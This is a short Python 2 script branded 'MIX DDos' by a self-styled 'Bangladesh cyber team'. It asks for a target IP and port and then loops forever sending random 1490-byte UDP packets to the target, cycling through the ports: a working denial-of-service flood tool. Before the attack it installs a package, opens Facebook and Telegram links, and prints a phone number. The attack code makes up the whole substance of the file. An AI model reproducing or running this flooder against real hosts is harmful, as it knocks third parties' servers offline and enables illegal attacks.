import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
os.system("pkg install espeak")
time.sleep(5)
os.system('xdg-open https://www.facebook.com/ArifcyberSzS404?mibextid=ZbWKwL')
os.system("clear")
os.system("figlet MIX DDos")
os.system("espeak \"welcome to Bangladesh cyber team \"")
os.system("espeak \"this tool make by mix cyber CEO Arif islam \"")
os.system('xdg-open https://t.me/mixcyberSzS404')
print 
print "\033[1;32mNAME        :ARIF ISLSM"
print "\033[1;33mNUBER      :01608367375"
print "FB ID:https://www.facebook.com/ArifcyberSzS404?mibextid=ZbWKwL"
print "\033[1;32mName  : MIX CYBER "
print
os.system("espeak \"welcome to Bangladesh cyber team \"")
os.system("espeak \"this tool maKe by mix cyber CEO Arif islam \"")
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet mix server ")
print "[                    ] 0% "
time.sleep(3)
print "\033[1;31m[load attack mix cyber ===               ] 400"
print("")
time.sleep(4)
print "\033[1;31m[load attack mixer cyber=======          ] 402"
print("")
time.sleep(5)
print "\033[1;33m[load attack mix cyber============     ] 403"
print("")
time.sleep(5)
print "\033[1;36m[successful ready to server attack ================] 404"
time.sleep(3)
sent = 0
while True:
     a=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print (a+"Sent %s mix server attack %s terget port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1
